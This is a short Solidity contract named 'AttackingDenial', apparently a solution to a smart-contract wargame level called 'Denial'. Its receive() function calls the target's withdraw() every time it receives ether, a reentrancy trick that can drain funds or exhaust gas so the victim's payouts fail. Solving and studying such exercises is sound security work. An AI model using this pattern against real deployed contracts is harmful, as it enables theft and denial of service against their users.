// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;
    Denial public denialContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        denialContract = Denial(contractAddress);
    }

    receive() external payable {
        denialContract.withdraw();
    }

}
